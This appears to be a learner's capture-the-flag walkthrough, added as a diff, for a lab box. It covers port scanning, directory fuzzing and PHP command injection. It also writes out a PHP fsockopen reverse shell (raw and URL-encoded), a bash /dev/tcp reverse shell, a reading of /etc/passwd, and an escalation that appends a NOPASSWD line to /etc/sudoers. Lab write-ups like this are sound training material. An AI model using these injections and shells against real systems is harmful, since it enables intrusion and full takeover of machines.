@@ -1,0 +1,133 @@
+</br> Do a basic port scan
+</br> nmap -sT -p- -T3 10.10.254.41 -v
+```
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+```
+</br> More advanced port scan
+```
+nmap 22 80 -A -T3 10.10.254.41 -v
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: U.A. High School
+MAC Address: 02:B3:8F:7B:A4:5B (Unknown)
+```
+</br> enumerate directories:
+
+</br> `gobuster dir -u http://10.10.254.41:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt `
+```
+/assets               (Status: 301) [Size: 313] [--> http://10.10.254.41/assets/]
+/server-status        (Status: 403) [Size: 277]
+```
+</br> /assets exists, but it's blank
+</br> there is at least css in the /assets folder, but it's restricted
+</br> That means there is more content, but we just can't see it from the client-side
+</br> 
+</br> fuzzing deeper -->
+</br> `wfuzz -c -f sub-fighter -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 31 http://10.10.254.41:80/assets/FUZZ`
+
+</br> seemingly there's nothing we can access here, since images is forbidden...
+</br> hunting through more wordlists since this can't be the comprehensive be-all-end-all...
+</br> `wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words.txt --hw 31 http://10.10.254.41:80/assets/FUZZ`
+
+</br> ! Just drill this into your head: if I find .php, I should try index.php for command injection
+
+</br> `whoami`
+</br> d3d3LWRhdGEK
+</br> What in the world is this response? An encoded name
+
+</br> 
+</br> inject to read `cat /etc/passwd`
+</br> cm9vdDp4 (omitted) ... c2UK
+</br> also read `ls -la content`
+</br> dG90YWwgMj (omitted) zcwo=
+</br> encrypted, with the = at the end looks like base64
+
+</br> `ls /home/deku | base64 -d`
+</br> it's supposed to be a user, but it's empty
+</br> 
+</br> there is an image file in /images called oneforal...
+</br> looks like the auto-decrypt might be malformed, or that name is just whack.
+</br> I cannot curl it because I don't have permission to get the resource
+</br> 
+</br> see if i can get a rev shell
+</br> 
+</br> netcat and reverse shell
+</br> nc -nvlp 1984
+
+```
+http://10.10.254.41/assets/index.php?cmd=php -r '$sock=fsockopen("10.10.105.73", 1984);exec("sh <&3 >&3 2>&3");'
+```
+
+</br> dang it, doesn't work....
+</br> I need to go to revshells.com and url encode this junk...
+</br> It's a command injection, so that should be a PHP exec situation.
+</br> (different IP because new session started, dumb timeouts...)
+```
+http://10.10.4.218/assets/index.php?cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.10.152.50%22%2C1984)%3Bexec(%22sh%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
+```
+</br> ^^^extract above lesson for a mini tutorial on php url injection reverse shells
+</br> 
+</br> upgrade to terminal session
+</br> python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+</br> set up a python server and a port in the directory with the images
+</br> wget the images off the port indicated by our python server; we need to use the ip of the target machine though.
+</br> 
+</br> `wget http://10.10.4.218/assets/images/yuei.jpg`
+</br> `wget http://10.10.4.218/assets/images/oneforall.jpg`
+</br> 
+</br> After both files are downloaded, look at them...
+</br> can't open them...
+</br> steghide doesn't recognize it either.
+</br> file command says it's data? Let's try changing it to .jpg like it seems it should be
+</br> 
+</br> gotta use hexedit and magic numbers as if it's corrupted file data we're restoring
+</br> 
+</br> `https://en.wikipedia.org/wiki/List_of_file_signatures`
+</br>  JPG starts off as : `FF D8 FF E0 00 10 4A 46 49 46 00 01`
+</br> 
+</br> `ctrl + x` --> quit editing, be sure to hit "y" to save when the prompt occurs
+</br> 
+</br> can't open anything as it wants a password
+</br> 
+</br> in typical web enumeration fashion, we search /var/www to see what contents we got, and find a hidden dir with a txt file in it.
+
+</br> QWxsbWlnaHRGb3JFdmVyISEhCg==
+</br> echo  QWxsbWlnaHRGb3JFdmVyISEhCg==| base64 -d
+</br> > AllmightForEver!!!
+</br> thank goodness there's not an auto-termination of file contents on a failure to input the correct passphrase. That would be some supa-hacka hot garbage.
+</br> 
+</br> content of creds.txt
+```
+Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:
+
+deku:One?For?All_!!one1/A
+```
+
+</br> ssh in with the creds...
+</br> (can now get user.txt)
+
+</br> let's not run sudo -l and NOT trip an alarming log...
+</br> `find / -perm -4000 2>/dev/null`
+</br> (should't this command also be configured to trigger an alarm?)
+</br> 
+</br> nothing i can do or find in /tmp...
+</br> sudo -l WAS the correct escalation path... I hate the mixed messages of what is or isn't best practice, learning one thing from one box doesn't apply to another... 
+</br> 
+</br> we can write to a .sh file; header claims it as /bin/bash.
+</br> 
+ </br> `bash -i >& /dev/tcp/10.10.152.50/1776 0>&1`
+</br> 
+</br> I can't execute commands, but apparently I can write or append to files with the shovel `>>` operator.
+</br> 
+</br> After some research, I find that I can add my current user to the /etc/sudoers file, giving me su access without needing to enter a password
+</br> 
+</br> deku ALL=NOPASSWD: ALL » /etc/sudoers
+</br> 
+</br> Neat ascii art, btw
